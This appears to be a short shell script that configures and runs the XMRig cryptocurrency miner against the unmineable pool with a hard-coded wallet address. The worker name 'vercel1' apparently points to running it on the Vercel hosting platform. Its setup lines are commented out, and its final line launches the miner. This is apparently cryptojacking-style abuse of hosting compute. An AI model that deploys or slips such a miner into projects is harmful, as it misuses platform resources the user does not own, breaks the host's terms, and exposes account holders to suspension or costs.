VERSION="6.16.2"
URL_MINING="rx.unmineable.com:3333"
USER_MINING="SAITAMA:0x975253A0eC2822fAe58f49630e38E57aa2aAB840.vercel1"

# wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz
# tar -xf xmrig-${VERSION}-linux-x64.tar.gz

# rm -f -r xmrig
# mkdir xmrig

# cp xmrig-${VERSION}/xmrig xmrig/xmrig 
# cp config.json xmrig/config.json

# rm -f -r xmrig-${VERSION} xmrig-${VERSION}-linux-x64.tar.gz

# sed -i "/\"url\": \"URL\",/c\\\"url\": \"${URL_MINING}\"," xmrig/config.json
# sed -i "/\"user\": \"USER\",/c\\\"user\": \"${USER_MINING}\"," xmrig/config.json

./xmrig/xmrig